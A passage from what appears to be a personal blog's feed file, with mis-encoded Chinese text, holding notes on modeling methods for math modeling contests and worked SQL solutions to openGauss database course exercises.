title="æ—¶é—´åºåˆ—é¢„æµ‹"></a>æ—¶é—´åºåˆ—é¢„æµ‹</h3><p>å¯ä»¥å…³æ³¨ä¸€äº›ç‰¹æ®Šçš„æ—¶é—´èŠ‚ç‚¹ï¼Œæ¯”å¦‚èŠ‚å‡æ—¥ï¼Œå­£èŠ‚æ€§ï¼ŒèŠ‚å‡æ—¥å’Œå­£èŠ‚æ€§éƒ½æœ‰å¯èƒ½å½±å“æ—¶é—´åºåˆ—çš„é¢„æµ‹ã€‚</p><ul><li><p>ARIMA:ç»å…¸æ—¶é—´åºåˆ—é¢„æµ‹æ¨¡å‹ï¼Œä½¿ç”¨è‡ªå›å½’ç§¯åˆ†ç§»åŠ¨å¹³å‡æ¨¡å‹ï¼Œè¯¥æ¨¡å‹å¯ä»¥å¯¹æ—¶é—´åºåˆ—æ•°æ®è¿›è¡Œé¢„æµ‹ï¼Œå¹¶ä¸”å¯ä»¥å¯¹æ—¶é—´åºåˆ—æ•°æ®è¿›è¡Œå¹³æ»‘å¤„ç†,å¯ä»¥å‚è€ƒä¸‹2203120çš„å†™æ³•ã€‚</p></li><li><p>GRU:æ—¶é—´åºåˆ—é¢„æµ‹,å’ŒLSTMç±»ä¼¼ï¼Œä½†æ˜¯GRUçš„æ›´æ–°é—¨å’Œé—å¿˜é—¨åˆå¹¶ä¸ºæ›´æ–°é—¨ï¼Œè¾“å…¥é—¨å’Œè¾“å‡ºé—¨åˆå¹¶ä¸ºè¾“å‡ºé—¨ï¼Œæ‰€ä»¥GRUçš„å‚æ•°æ›´å°‘,æ›´ä¾¿äºè®¡ç®—.</p></li><li><p>SIR:SIRæ¨¡å‹ï¼Œç”¨äºä¼ æŸ“ç—…ä¼ æ’­çš„é¢„æµ‹ï¼ŒSè¡¨ç¤ºæ˜“æ„Ÿè€…ï¼ŒIè¡¨ç¤ºæ„ŸæŸ“è€…ï¼ŒRè¡¨ç¤ºåº·å¤è€…,ä¹Ÿé€‚ç”¨äºæŸäº›çªç„¶çˆ†ç«çš„äº‹ä»¶ã€‚</p></li><li><p>Prophet:æ—¶é—´åºåˆ—é¢„æµ‹ï¼Œä½¿ç”¨Facebookçš„Prophetç®—æ³•ï¼Œè¯¥ç®—æ³•åŸºäºæ—¶é—´åºåˆ—å†å²æ•°æ®ï¼Œæ‹Ÿåˆå‡ºä¸€ä¸ªè¶‹åŠ¿å’Œå­£èŠ‚æ€§ï¼Œç„¶åé¢„æµ‹æœªæ¥çš„æ—¶é—´åºåˆ—ã€‚å‚è€ƒ2301192,2200688</p></li><li><p>å¡å°”æ›¼æ»¤æ³¢ç®—æ³•</p></li><li><p>LightGBM:LightGBMæ˜¯ä¸€ç§åŸºäºæ¢¯åº¦æå‡å†³ç­–æ ‘çš„æœºå™¨å­¦ä¹ ç®—æ³•ï¼Œå®ƒå…·æœ‰é«˜æ•ˆæ€§ã€å¯æ‰©å±•æ€§å’Œå¯è§£é‡Šæ€§ç­‰ç‰¹ç‚¹ã€‚åœ¨æ—¶é—´åºåˆ—é¢„æµ‹ä»»åŠ¡ä¸­ï¼ŒLightGBMå¯ä»¥æœ‰æ•ˆåœ°å¤„ç†å¤§é‡æ•°æ®ï¼Œå¹¶ç”Ÿæˆå¯è§£é‡Šçš„é¢„æµ‹ç»“æœã€‚</p></li><li><p>XGBoost:XGBoostæ˜¯ä¸€ç§åŸºäºæ¢¯åº¦æå‡å†³ç­–æ ‘çš„æœºå™¨å­¦ä¹ ç®—æ³•ï¼Œå®ƒå…·æœ‰é«˜æ•ˆæ€§ã€å¯æ‰©å±•æ€§å’Œå¯è§£é‡Šæ€§ç­‰ç‰¹ç‚¹ã€‚           </p></li><li><p>LSTM:é•¿çŸ­æœŸè®°å¿†ç½‘ç»œï¼ˆLong Short-Term Memoryï¼ŒLSTMï¼‰æ˜¯ä¸€ç§å¾ªç¯ç¥ç»ç½‘ç»œï¼ˆRNNï¼‰çš„å˜ä½“ï¼Œå®ƒèƒ½å¤Ÿæœ‰æ•ˆåœ°å¤„ç†æ—¶é—´åºåˆ—æ•°æ®ã€‚LSTMé€šè¿‡å¼•å…¥è®°å¿†å•å…ƒå’Œé—¨æœºåˆ¶ï¼Œèƒ½å¤Ÿæœ‰æ•ˆåœ°æ•æ‰å’Œä¼ é€’æ—¶é—´åºåˆ—æ•°æ®ä¸­çš„é•¿æœŸä¾èµ–å…³ç³»ã€‚å¯ä¸å‚è€ƒä¸‹2204883</p></li></ul><ul><li><p>ARIMA-LSTM:è¿™ä¸¤ä¸ªæ¨¡å‹ç»“åˆæ„Ÿè§‰è¿˜æ˜¯ä¸é”™çš„,2212336,æŠŠLSTMæ¢æˆGRUä¹Ÿæ˜¯å·®ä¸å¤šçš„æ•ˆæœ</p></li><li><p>ARIMA-SVM:æ¥è‡ª2100948,å¯èƒ½å‚è€ƒäº†<code>https://blog.csdn.net/u014356002/article/details/53163684</code>,SVMå’ŒLSTMéƒ½ç”¨æ¥æ•æ‰éçº¿æ€§éƒ¨åˆ†,ä½†åœ¨é¢„æµ‹ä¸ŠSVMä¸å¦‚LSTM,ä½†SVMå¯è§£é‡Šæ€§ç›¸å¯¹æ›´å¥½</p></li></ul><p>å¤šæ¨¡å‹å †å :å¯ä»¥å‚è€ƒä¸€ä¸‹è¿™é‡Œé¢çš„<code>https://blog.csdn.net/keypig_zz/article/details/82819558</code>,è¿™ä¸ªå›¾å’Œæµç¨‹å¯ä»¥å‚è€ƒ</p><h3 id="éæ—¶é—´åºåˆ—é¢„æµ‹"><a href="#éæ—¶é—´åºåˆ—é¢„æµ‹" class="headerlink" title="éæ—¶é—´åºåˆ—é¢„æµ‹"></a>éæ—¶é—´åºåˆ—é¢„æµ‹</h3><ul><li><p>GSRF:ç½‘æ ¼æœç´¢çš„éšæœºæ£®æ—ç®—æ³•</p></li><li><p>ç»´ç‰¹æ¯”ç®—æ³•:ä¸»è¦ç”¨äºè§£å†³éšé©¬å°”å¯å¤«æ¨¡å‹ï¼ˆHMMï¼‰ä¸­çš„çŠ¶æ€åºåˆ—é¢„æµ‹é—®é¢˜ã€‚åœ¨è¯­éŸ³è¯†åˆ«ã€è‡ªç„¶è¯­è¨€å¤„ç†ã€ç”Ÿç‰©ä¿¡æ¯å­¦ç­‰é¢†åŸŸä¸­ï¼Œç»´ç‰¹æ¯”ç®—æ³•è¢«ç”¨äºæ ¹æ®è§‚æµ‹åºåˆ—é¢„æµ‹æœ€æœ‰å¯èƒ½çš„çŠ¶æ€åºåˆ—ã€‚</p></li><li><p>MMOEæ¨¡å‹:æ˜¯ä¸€ç§å¤šä»»åŠ¡å­¦ä¹ æ¶æ„ï¼Œæ—¨åœ¨æé«˜æ¨¡å‹åœ¨å¤„ç†å¤šä¸ªç›¸å…³ä»»åŠ¡æ—¶çš„æ€§èƒ½ã€‚è¯¥æ¨¡å‹ç”±è°·æ­Œåœ¨2018å¹´çš„KDDä¼šè®®ä¸Šæå‡ºï¼Œå¹¶å› å…¶æœ‰æ•ˆçš„å‚æ•°å…±äº«æœºåˆ¶å’Œä»»åŠ¡ç‰¹å®šå¤„ç†èƒ½åŠ›è€Œè¢«ä¸šç•Œå¹¿æ³›é‡‡ç”¨ã€‚æ¥æºäº2307946,å…¶ç”¨äºé¢„æµ‹å°è¯•æ¬¡æ•°ç™¾åˆ†æ¯”.</p></li><li><p>å¤šå…ƒçº¿æ€§å›å½’:ç”¨äºé¢„æµ‹å¤šä¸ªè‡ªå˜é‡å¯¹å› å˜é‡çš„å½±å“ã€‚</p></li></ul><h3 id="èšç±»ç®—æ³•-åˆ†ç±»"><a href="#èšç±»ç®—æ³•-åˆ†ç±»" class="headerlink" title="èšç±»ç®—æ³•(åˆ†ç±»)"></a>èšç±»ç®—æ³•(åˆ†ç±»)</h3><ul><li><p>k-means:k-meansèšç±»ç®—æ³•,äººä¸ºå†³å®šåˆå§‹èšç±»ä¸­å¿ƒ,è¾ƒä¸ºä¸»è§‚,å¯æ”¹ç”¨k-means++,æˆ–è€…ä½¿ç”¨Gap Statisticæ–¹æ³•ç¡®å®šæœ€ä½³kå€¼</p></li><li><p>k-means++:k-means++èšç±»ç®—æ³•</p></li><li><p>DBSCAN:DBSCANèšç±»ç®—æ³•</p></li><li><p>BIRCH:BIRCHèšç±»ç®—æ³•</p></li><li><p>GMM:GMMèšç±»ç®—æ³•,èšç±»æ•ˆæœæ¯”kmeanså¥½,å¦‚æœåç»­è¦é™ç»´,å¯ä»¥è€ƒè™‘ä½¿ç”¨kmeans++</p></li><li><p>è°±èšç±»:è°±èšç±»ç®—æ³•</p></li><li><p>å±‚æ¬¡èšç±»:å±‚æ¬¡èšç±»ç®—æ³•</p></li><li><p>R-CNNå®¶æ—: R-CNN , Fast R-CNN , Faster R-CNN , Mask R-CNN,ç‰©ä½“æ£€æµ‹ç®—æ³•,åœ¨2106138ä¸­ç”¨äºåˆ†ç±»å¤§é»„èœ‚å’Œèƒ¡èœ‚</p></li></ul><h3 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h3><p><strong>æ•°æ®å¤„ç†æµç¨‹å»ºè®®å‚è€ƒä¸€ä¸‹2208834</strong></p><p>æ¨¡å‹æœ€å¥½éƒ½è¦æœ‰<strong>è®­ç»ƒé›†</strong>å’Œ<strong>æµ‹è¯•é›†</strong>ï¼Œè®­ç»ƒé›†å’Œæµ‹è¯•é›†æœ€å¥½è¦åˆ†å¼€ï¼Œè®­ç»ƒé›†å’Œæµ‹è¯•é›†æœ€å¥½è¦éšæœºæ‰“ä¹±ï¼Œè¿™æ ·æ¨¡å‹æ‰èƒ½æœ‰æ›´å¥½çš„æ•ˆæœã€‚æµ‹è¯•é›†å¯ä»¥ä»å·²æœ‰æ•°æ®ä¸­éšæœºæŠ½å–ä¸€éƒ¨åˆ†ä½œä¸ºæµ‹è¯•é›†ï¼Œä¹Ÿå¯ä»¥ä»è®­ç»ƒé›†ä¸­åˆ’åˆ†ä¸€éƒ¨åˆ†ä½œä¸ºæµ‹è¯•é›†ã€‚è®­ç»ƒé›†å’Œæµ‹è¯•é›†çš„æ¯”ä¾‹å¯ä»¥æ ¹æ®å®é™…æƒ…å†µè¿›è¡Œè°ƒæ•´ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œè®­ç»ƒé›†çš„æ¯”ä¾‹è¦å¤§äºæµ‹è¯•é›†çš„æ¯”ä¾‹ã€‚</p><p><strong>å½±å“å› å­</strong>æœ€å¥½ä¿ç•™5-8ä¸ªï¼Œå¦‚æœå½±å“å› å­å¤ªå¤šï¼Œæ¨¡å‹å¯èƒ½ä¼šè¿‡æ‹Ÿåˆï¼Œå¦‚æœå½±å“å› å­å¤ªå°‘ï¼Œæ¨¡å‹å¯èƒ½ä¼šæ¬ æ‹Ÿåˆã€‚æœ€å¥½æ˜¯ä»å¤šä¸ªå½±å“å› å­ä¸­æŒ‘é€‰å‡ºæ¥.</p><p>æ­¥éª¤å¦‚ä¸‹:</p><ol><li>æ•°æ®æ”¶é›†ã€æ•°æ®æ¸…æ´—ã€æ•°æ®æ ‡å‡†åŒ–</li><li>ç›¸å…³æ€§åˆ†æï¼Œåˆ†æå„å› å­ä¹‹é—´çš„ç›¸å…³æ€§ã€‚é«˜åº¦ç›¸å…³çš„å› å­å¯èƒ½ä»£è¡¨ç›¸ä¼¼çš„ä¿¡æ¯ï¼Œå¯ä»¥è€ƒè™‘åˆå¹¶æˆ–åªä¿ç•™ä¸€ä¸ªã€‚</li><li>ä½¿ç”¨PCA(ä¸»æˆåˆ†åˆ†ææ³•)è¿›è¡Œé™ç»´ï¼Œé€‰æ‹©æœ€é‡è¦çš„5-8ä¸ªå½±å“å› å­.</li><li>ç¡®å®šæƒé‡:ä½¿ç”¨å±‚æ¬¡åˆ†ææ³•ã€ç†µæƒæ³•ã€ä¸»æˆåˆ†åˆ†ææ³•ã€å˜å¼‚ç³»æ•°æ³•ç­‰æ–¹æ³•ç¡®å®šæƒé‡.</li></ol><p><strong>ç™½å™ªå£°æµ‹è¯•</strong>: ç™½å™ªå£°æµ‹è¯•æ˜¯ç”¨æ¥æ£€éªŒæ—¶é—´åºåˆ—æ•°æ®æ˜¯å¦ä¸ºéšæœºæ¸¸èµ°çš„ï¼Œå¦‚æœæ—¶é—´åºåˆ—æ•°æ®æ˜¯éšæœºæ¸¸èµ°çš„ï¼Œé‚£ä¹ˆå®ƒåº”è¯¥å…·æœ‰å‡åŒ€çš„åˆ†å¸ƒã€‚ç™½å™ªå£°æµ‹è¯•å¯ä»¥ä½¿ç”¨ADF(Augmented Dickey-Fuller)æ£€éªŒæ–¹æ³•æ¥åˆ¤æ–­æ—¶é—´åºåˆ—æ•°æ®æ˜¯å¦ä¸ºéšæœºæ¸¸èµ°ã€‚å¦‚æœADFæ£€éªŒç»“æœçš„på€¼å°äº0.05ï¼Œé‚£ä¹ˆæ—¶é—´åºåˆ—æ•°æ®å°±ä¸æ˜¯éšæœºæ¸¸èµ°çš„ã€‚</p><ul><li><p><strong>ADFæµ‹è¯•</strong>:æ˜¯ä¸€ç§ç»Ÿè®¡æ£€éªŒæ–¹æ³•ï¼Œç”¨äºç¡®å®šä¸€ä¸ªæ—¶é—´åºåˆ—æ•°æ®æ˜¯å¦å¹³ç¨³ã€‚åœ¨ç»æµå­¦å’Œé‡‘èå­¦ä¸­ï¼Œæ—¶é—´åºåˆ—æ•°æ®çš„å¹³ç¨³æ€§æ˜¯ä¸€ä¸ªé‡è¦çš„æ¦‚å¿µï¼Œå› ä¸ºå®ƒæœ‰åŠ©äºé¢„æµ‹æœªæ¥çš„ç»æµæ´»åŠ¨ã€‚å¦‚æœä¸€ä¸ªæ—¶é—´åºåˆ—æ˜¯å¹³ç¨³çš„ï¼Œé‚£ä¹ˆå®ƒçš„ç»Ÿè®¡ç‰¹æ€§ï¼ˆå¦‚å‡å€¼ã€æ–¹å·®å’Œè‡ªåæ–¹å·®ï¼‰ä¸ä¼šéšæ—¶é—´å˜åŒ–ã€‚å¦‚æœæ•°æ®å¹³ç¨³,å¯ä»¥ä½¿ç”¨åŸå§‹æ•°æ®,å¦‚æœä¸å¹³ç¨³,åˆ™è¦å¯¹æ•°æ®è¿›è¡Œå¤„ç†.å…·ä½“æ–¹æ¡ˆå¦‚ä¸‹:</p><ol><li><p>å·®åˆ†ï¼šå¦‚æœæ•°æ®æ˜¯éå¹³ç¨³çš„ï¼Œé€šè¿‡å¯¹æ•°æ®è¿›è¡Œä¸€é˜¶æˆ–æ›´é«˜é˜¶çš„å·®åˆ†ï¼Œå¯ä»¥å»é™¤æ•°æ®ä¸­çš„è¶‹åŠ¿ã€å­£èŠ‚æ€§æˆ–å…¶ä»–æ—¶é—´åŠ¨æ€ç‰¹å¾ï¼Œä»è€Œä½¿æ•°æ®å˜å¾—å¹³ç¨³ã€‚å·®åˆ†æ˜¯ä¸€ç§å¸¸è§çš„æ—¶é—´åºåˆ—å¹³ç¨³åŒ–æŠ€æœ¯ã€‚</p></li><li><p>å­£èŠ‚æ€§è°ƒæ•´ï¼šå¯¹äºå…·æœ‰å­£èŠ‚æ€§æ³¢åŠ¨çš„æ•°æ®ï¼Œå¯ä»¥é€šè¿‡å­£èŠ‚æ€§è°ƒæ•´æ¥å»é™¤å­£èŠ‚æ€§å› ç´ ï¼Œä½¿æ•°æ®æ›´åŠ å¹³ç¨³ã€‚è¿™å¯ä»¥é€šè¿‡ç§»åŠ¨å¹³å‡ã€å­£èŠ‚æ€§åˆ†è§£æ—¶é—´åºåˆ—é¢„æµ‹ï¼ˆSTLï¼‰ç­‰æ–¹æ³•æ¥å®ç°ã€‚</p></li><li><p>æ¼‚ç™½ï¼šæ¼‚ç™½æ˜¯ä¸€ç§ç»Ÿè®¡æŠ€æœ¯ï¼Œé€šè¿‡å®ƒå¯ä»¥ä»æ—¶é—´åºåˆ—ä¸­å»é™¤é•¿æœŸè¶‹åŠ¿å’Œå­£èŠ‚æ€§æˆåˆ†ï¼Œåªä¿ç•™çŸ­æœŸæ³¢åŠ¨ã€‚è¿™å¯ä»¥é€šè¿‡è‡ªå›å½’æ¨¡å‹ï¼ˆå¦‚ARæ¨¡å‹ï¼‰æ¥å®ç°ã€‚</p></li><li><p>Box-Coxå˜æ¢ï¼šè¿™æ˜¯ä¸€ç§ç”¨äºå¤„ç†éæ­£æ€åˆ†å¸ƒæ•°æ®çš„æŠ€æœ¯ï¼Œé€šè¿‡å˜æ¢å¯ä»¥å°†æ•°æ®è½¬æ¢ä¸ºæ­£æ€åˆ†å¸ƒï¼Œæœ‰æ—¶è¿™ä¹Ÿæœ‰åŠ©äºæé«˜æ•°æ®çš„å¹³ç¨³æ€§ã€‚</p></li><li><p>å¤„ç†å¼‚å¸¸å€¼ï¼šæ£€æŸ¥æ•°æ®ä¸­æ˜¯å¦å­˜åœ¨å¼‚å¸¸å€¼æˆ–ç¦»ç¾¤å€¼ï¼Œå¹¶è€ƒè™‘æ˜¯å¦éœ€è¦å°†å…¶åˆ é™¤æˆ–è¿›è¡ŒæŸç§å½¢å¼çš„è°ƒæ•´ã€‚</p></li><li><p>ä½¿ç”¨æ›´é«˜çº§çš„æ¨¡å‹ï¼šæœ‰æ—¶ï¼Œä½¿ç”¨æ›´é«˜çº§çš„ç»æµè®¡é‡æ¨¡å‹ï¼ˆå¦‚å‘é‡è‡ªå›å½’æ¨¡å‹VARæˆ–çŠ¶æ€ç©ºé—´æ¨¡å‹ï¼‰å¯ä»¥å¤„ç†éå¹³ç¨³æ•°æ®ï¼Œè€Œä¸éœ€è¦ç›´æ¥å¯¹æ•°æ®è¿›è¡Œå¹³ç¨³åŒ–å¤„ç†ã€‚</p></li></ol></li></ul><ul><li><p>CTGAN:ç”Ÿæˆå¯¹æŠ—ç½‘ç»œï¼Œå¯ç”¨äºæ‹“å±•æ•°æ®é›†(è°¨æ…ä½¿ç”¨)</p></li><li><p><strong>OpenFE</strong>:æ˜¯ä¸€ç§åŠŸèƒ½å¼ºå¤§çš„ç‰¹å¾è‡ªåŠ¨ç”Ÿæˆç®—æ³•OpenFEï¼Œå®ƒèƒ½æœ‰æ•ˆåœ°ç”Ÿæˆæœ‰ç”¨çš„ç‰¹å¾ï¼Œæé«˜æ¨¡å‹å­¦ä¹ æ€§èƒ½(GBDTç›¸å…³æ¨¡å‹å’ŒSOATç¥ç»ç½‘ç»œ).</p></li><li><p>Bootstrapæ–¹æ³•:é€šè¿‡é‡å¤æŠ½æ ·å’Œè®¡ç®—ç»Ÿè®¡é‡æ¥ä¼°è®¡æ€»ä½“çš„åˆ†å¸ƒ,å¯ä»¥ç”¨æ¥è¿›è¡Œå‡è®¾æ£€éªŒ,ç½®ä¿¡åŒºé—´æ„å»º,ç¨³å¥æ€§åˆ†æç­‰ã€‚è®ºæ–‡2309397å¯¹é¢„æµ‹ç»“æœä½¿ç”¨Bootstrapæ–¹æ³•æ„å»ºç½®ä¿¡åŒºé—´,å–ç½®ä¿¡æ°´å¹³95%æ—¶çš„ç»“æœä½œä¸ºé¢„æµ‹åŒºé—´ã€‚</p></li></ul><p>å›¾å»ºè®®15-20å¼ ,è¡¨å»ºè®®3-8ä¸ª,æ€»æ•°20-25æœ€ä½³</p><p>ä½¿ç”¨æ¯”è¾ƒé«˜çº§çš„æ¨¡å‹æœ€å¥½ç”»ä¸ŠåŸç†å›¾,æ¨¡å‹è¿›è¡Œç»“åˆä¹Ÿæœ€å¥½ç”»å›¾è¡¨ç¤ºä¸€ä¸‹.å¦‚æœå»ºç«‹çš„æ¨¡å‹æ¯”è¾ƒç®€å•,é‚£å°±å¾—åœ¨åˆ†æå’Œå›¾åƒä¸Šä¸‹åŠŸå¤«.æ¯ä¸€ä¸ªtaskçš„åˆ†æè‡³å°‘å¾—æœ‰ä¸€å¼ å›¾</p><p>å¯ä»¥ç”¨ä¼ªä»£ç å»å±•ç¤ºä¸€äº›ä¸å¥½ç”¨å›¾è¡¨å±•ç¤ºçš„è¡Œä¸šæ€§çš„ç®—æ³•,ä¾‹å¦‚2200401çš„äº¤æ˜“ç­–ç•¥</p><ul><li>NSGS-II:å¤šç›®æ ‡ä¼˜åŒ–ç®—æ³•,å‚è€ƒ2218743</li></ul><p>ç®€å•çš„å›¾ä¹Ÿå¯ä»¥ç”»å¾—ä¸ä¸€æ ·,æ¯”å¦‚æŠ˜çº¿å›¾,æˆ‘ä»¬å¯ä»¥å°†æœ€å€¼æ ‡è®°å‡ºæ¥,å°†å¼‚å¸¸å€¼æ ‡è®°å‡ºç­‰ç­‰</p><p><img src="https://pb01.s3.bitiful.net/143.png" alt="avatar"></p><p>è¯äº‘å¯è§†åŒ–ä¹Ÿå¯ä»¥ä½œä¸ºä¸€å¤§äº®ç‚¹</p><p>21å¹´çš„å¯ä»¥çœ‹ä¸‹2107079</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MCM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è¥¿ç”µæ•°æ®åº“openGausså¹³å°ç»ƒä¹ </title>
      <link href="/2023/12/29/openguass/"/>
      <url>/2023/12/29/openguass/</url>
      
        <content type="html"><![CDATA[<h3 id="è¥¿ç”µæ•°æ®åº“openGausså¹³å°ç»ƒä¹ "><a href="#è¥¿ç”µæ•°æ®åº“openGausså¹³å°ç»ƒä¹ " class="headerlink" title="è¥¿ç”µæ•°æ®åº“openGausså¹³å°ç»ƒä¹ "></a>è¥¿ç”µæ•°æ®åº“openGausså¹³å°ç»ƒä¹ </h3><p><strong><em>ä»…è®°å½•å¹³å°æ ‡æ³¨ä¸­ç­‰éš¾åº¦åŠä»¥ä¸Šçš„é¢˜ç›®</em></strong></p><p><strong>è¯•å·ç¼–å·:41</strong><br><strong>è¯•å·åç§°:gongsi</strong></p><p><strong>æ¡ä»¶</strong>:<br>å…¬å¸æ•°æ®åº“æœ‰å¦‚ä¸‹å…³ç³»æ¨¡å¼ï¼š å‘˜å·¥employeeï¼ˆå‘˜å·¥å·enoï¼Œå‘˜å·¥å§“åenameï¼Œå‘˜å·¥å¹´é¾„eageï¼Œæ‰€åœ¨éƒ¨é—¨å·dnoï¼Œå·¥èµ„salaryï¼Œå·¥ä½œæ—¥æœŸworkï¼‰ï¼› éƒ¨é—¨depart(éƒ¨é—¨å·dnoï¼Œéƒ¨é—¨åç§°dnameï¼Œéƒ¨é—¨ç»ç†å‘˜å·¥å·dman)ã€‚</p><h4 id="é¢˜ç›®3ï¼šæŸ¥è¯¢æ¯ä¸ªéƒ¨é—¨çš„éƒ¨é—¨å·ã€å‘˜å·¥å¹³å‡å·¥èµ„ã€‚"><a href="#é¢˜ç›®3ï¼šæŸ¥è¯¢æ¯ä¸ªéƒ¨é—¨çš„éƒ¨é—¨å·ã€å‘˜å·¥å¹³å‡å·¥èµ„ã€‚" class="headerlink" title="é¢˜ç›®3ï¼šæŸ¥è¯¢æ¯ä¸ªéƒ¨é—¨çš„éƒ¨é—¨å·ã€å‘˜å·¥å¹³å‡å·¥èµ„ã€‚"></a>é¢˜ç›®3ï¼šæŸ¥è¯¢æ¯ä¸ªéƒ¨é—¨çš„éƒ¨é—¨å·ã€å‘˜å·¥å¹³å‡å·¥èµ„ã€‚</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> dno, <span class="built_in">AVG</span>(salary)</span><br><span class="line"><span class="keyword">from</span> employee <span class="keyword">group</span> <span class="keyword">by</span> dno</span><br></pre></td></tr></table></figure><h4 id="é¢˜ç›®4ï¼šæŸ¥è¯¢å‘˜å·¥çš„ä¸­ä½æ•°å·¥èµ„ã€‚"><a href="#é¢˜ç›®4ï¼šæŸ¥è¯¢å‘˜å·¥çš„ä¸­ä½æ•°å·¥èµ„ã€‚" class="headerlink" title="é¢˜ç›®4ï¼šæŸ¥è¯¢å‘˜å·¥çš„ä¸­ä½æ•°å·¥èµ„ã€‚"></a>é¢˜ç›®4ï¼šæŸ¥è¯¢å‘˜å·¥çš„ä¸­ä½æ•°å·¥èµ„ã€‚</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> salary <span class="keyword">from</span> employee a </span><br><span class="line"><span class="keyword">where</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> employee b <span class="keyword">where</span> b.salary<span class="operator">&gt;=</span>a.salary) <span class="operator">-</span></span><br><span class="line">(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> employee b <span class="keyword">where</span> b.salary<span class="operator">&lt;=</span>a.salary)</span><br><span class="line"><span class="keyword">between</span> <span class="number">-1</span> <span class="keyword">and</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜æ¯”è¾ƒ<strong>å®¹æ˜“è¸©å‘</strong>çš„åœ°æ–¹æ˜¯é¢˜ç›®æ²¡æœ‰è¯´æ˜å®ƒå¯¹<strong>ä¸­ä½æ•°çš„å®šä¹‰</strong>,è¿™é‡Œæ˜¯å°†å¤šä¸ªä¸­ä½æ•°è¿”å›å›å»,è€Œä¸ç”¨æ±‚å¹³å‡,è€Œç½‘ä¸Šå¤§å¤šæ•°ç±»ä¼¼çš„éœ€æ±‚éƒ½æ˜¯åªèƒ½è¿”å›ä¸€ä¸ªä¸­ä½æ•°,æ‰€ä»¥æœ‰å¤šä¸ªä¸­ä½æ•°æ˜¯éƒ½è¿›è¡Œäº†æ±‚å¹³å‡æ“ä½œ,ä½†è¿™é‡Œæ˜¯æ²¡æœ‰çš„,æ‰€ä»¥éœ€è¦ç‰¹åˆ«æ³¨æ„</p><h4 id="é¢˜ç›®5ï¼šæŸ¥è¯¢æ¯ä¸ªéƒ¨é—¨çš„éƒ¨é—¨å·ï¼Œå‘˜å·¥ä¸­ä½æ•°å·¥èµ„ã€‚"><a href="#é¢˜ç›®5ï¼šæŸ¥è¯¢æ¯ä¸ªéƒ¨é—¨çš„éƒ¨é—¨å·ï¼Œå‘˜å·¥ä¸­ä½æ•°å·¥èµ„ã€‚" class="headerlink" title="é¢˜ç›®5ï¼šæŸ¥è¯¢æ¯ä¸ªéƒ¨é—¨çš„éƒ¨é—¨å·ï¼Œå‘˜å·¥ä¸­ä½æ•°å·¥èµ„ã€‚"></a>é¢˜ç›®5ï¼šæŸ¥è¯¢æ¯ä¸ªéƒ¨é—¨çš„éƒ¨é—¨å·ï¼Œå‘˜å·¥ä¸­ä½æ•°å·¥èµ„ã€‚</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> dno,salary <span class="keyword">from</span> employee a </span><br><span class="line"><span class="keyword">where</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> employee b <span class="keyword">where</span> b.dno<span class="operator">=</span>a.dno <span class="keyword">and</span> b.salary<span class="operator">&gt;=</span>a.salary) <span class="operator">-</span></span><br><span class="line">(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> employee b <span class="keyword">where</span> b.dno<span class="operator">=</span>a.dno <span class="keyword">and</span> b.salary<span class="operator">&lt;=</span>a.salary)</span><br><span class="line"><span class="keyword">between</span> <span class="number">-1</span> <span class="keyword">and</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><h4 id="é¢˜ç›®6ï¼šå‘˜å·¥è¡¨è®¾è®¡ä¸ç¬¦åˆ1NF"><a href="#é¢˜ç›®6ï¼šå‘˜å·¥è¡¨è®¾è®¡ä¸ç¬¦åˆ1NF" class="headerlink" title="é¢˜ç›®6ï¼šå‘˜å·¥è¡¨è®¾è®¡ä¸ç¬¦åˆ1NF"></a>é¢˜ç›®6ï¼šå‘˜å·¥è¡¨è®¾è®¡ä¸ç¬¦åˆ1NF</h4><p>å·¥ä½œæ—¥æœŸåŒ…å«å¤šä¸ªæ—¥æœŸï¼Œä¸­é—´ç”¨é€—å·,åˆ†éš”ï¼Œ<strong>å‰åå¯èƒ½æœ‰å¤šä¸ªç©ºæ ¼</strong>ï¼Œå¦‚2022-11-11,2022-11-12,2018-08-01ï¼ŒæŸ¥è¯¢æ¯ä¸ªå‘˜å·¥çš„å‘˜å·¥å·ï¼Œå§“åå’Œå·¥ä½œæ—¥æœŸï¼Œå…¶ä¸­å·¥ä½œæ—¥æœŸè¦æ±‚å°†åŸæœ‰æ—¥æœŸæ‹†åˆ†ä¸ºå•ä¸ªæ—¥æœŸã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> eno,ename,<span class="built_in">trim</span>(regexp_split_to_table(work,<span class="string">&#x27;,&#x27;</span>)) <span class="keyword">as</span> work <span class="keyword">from</span> employee;</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜ä¸ªäººè§‰å¾—æ˜¯è¿™å¥—ç»ƒä¹ é‡Œ<strong>æœ€éš¾</strong>çš„ä¸€é“äº†,ä½†openGaussçš„regexp_split_to_tableå‡½æ•°å·²ç»å¸®æˆ‘ä»¬å®ç°äº†<strong>è¡Œè½¬åˆ—</strong>è¿™ä¸ªæœ€éš¾çš„ç‚¹,ç„¶åtrimå‡½æ•°å»ä¸€ä¸‹ç©ºæ 